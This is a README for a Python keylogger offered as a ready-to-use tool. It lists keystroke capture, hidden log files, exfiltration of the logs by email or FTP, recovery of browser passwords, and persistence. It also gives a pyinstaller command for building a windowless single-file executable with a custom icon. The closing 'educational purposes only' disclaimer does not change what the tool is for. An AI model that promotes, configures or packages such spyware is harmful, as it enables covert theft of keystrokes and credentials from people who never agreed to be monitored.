# KeyLogger
A python cross-platform keylogger's class

# Functions #

* Logs every keyboard event and where it has happend.
* Save logs to file ( Hidden ).
* Send logs (via email or ftp).
* Attempt to recover cached password in browsers and other programs ( For more infos visit: https://github.com/AlessandroZ/LaZagne )
* Make itself persistent.
* Cross-Platform.

***

# Setting it up #

Use example.py as a base, edit the example i provided with your credentials.
Keep in mind that:

* If you want to send logs via email set METHOD as 0 and fill in the needed variables.
* If you want to send logs via FTP set METHOD as 1 fill in the needed variables, and remember to change the constructor(Explained on the example).

# How to make a more portable version # 
To make it more portable you could use pyinstaller or py2exe, those modules allow you to compile your python script into an executable file including everything the script needs to run (Libraries,Python itself and so on).

Let's begin*:

* First of all install or make sure you have installed pyinstaller module.
* Move to the directory where there's you're file.
* And execute the following command: pyinstaller --noconsole --onefile --ico=icon.ico yourfile.py
Where --noconsole means that the script is not going to have a console where it prints and prompt stuff and where --onefile means that everything will be included in the executable, no other files.
Optionally you can use --ico=youricon.ico to replace default file icon.

* Now move to the freshly created (during the compilation) directory dist and here is your executable.

# More #

Remember that this repository is for educational purposes only.
I'm not responsible of anything you'll do with those files.

You can find me on:

* [Holeboards](www.holeboards.eu)
* [Telegram](www.telegram.me/eigoog)
